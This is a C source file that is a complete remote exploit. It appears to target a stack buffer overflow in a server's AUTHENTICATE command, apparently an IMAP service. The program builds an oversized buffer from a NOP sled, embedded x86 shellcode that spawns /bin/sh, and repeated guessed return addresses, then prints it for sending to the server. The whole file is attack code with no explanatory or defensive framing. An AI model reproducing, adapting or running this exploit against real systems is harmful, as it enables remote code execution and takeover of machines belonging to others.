#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFLEN (2*1024)
#define NOP 0x90

char shell[] =
"\xeb\x34\x5e\x8d\x1e\x89\x5e\x0b\x31\xc0\x89\x56\x07"
"\x89\x56\x0b\x89\x56\x11\x43\x8d\x4a\x01\x89\x4e\x15"
"\x8d\x4e\x0b\x31\xc9\x88\x46\x20\x46\x88\x46\x21\x47"
"\x89\x56\x23\x31\xc0\xb0\x0b\xcd\x80\xe8\xc7\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x53\x50\x54\x52"
"\x52\xb0\x0b\x50\xcd\x80";

char buf[BUFLEN];

unsigned long int nop, esp;
long int offset;

int main(int argc, char *argv[])
{
    int i;

    nop = 403; offset = 100;
    if (argc > 2) nop = atoi(argv[2]);
    if (argc > 1) offset = atoi(argv[1]);

    esp = 0xbffff501;

    memset(buf, NOP, BUFLEN);
    memcpy(buf+nop, shell, strlen(shell));
    for (i = nop+strlen(shell); i < BUFLEN - 4; i += 4)
        *(long *)&buf[i] = esp + offset;

    printf("AUTHENTICATE {%.0d}\r\n", BUFLEN);
    for (i = 0; i < BUFLEN; i++)
        putchar(buf[i]);

    printf("\r\n");

    return 0;
}
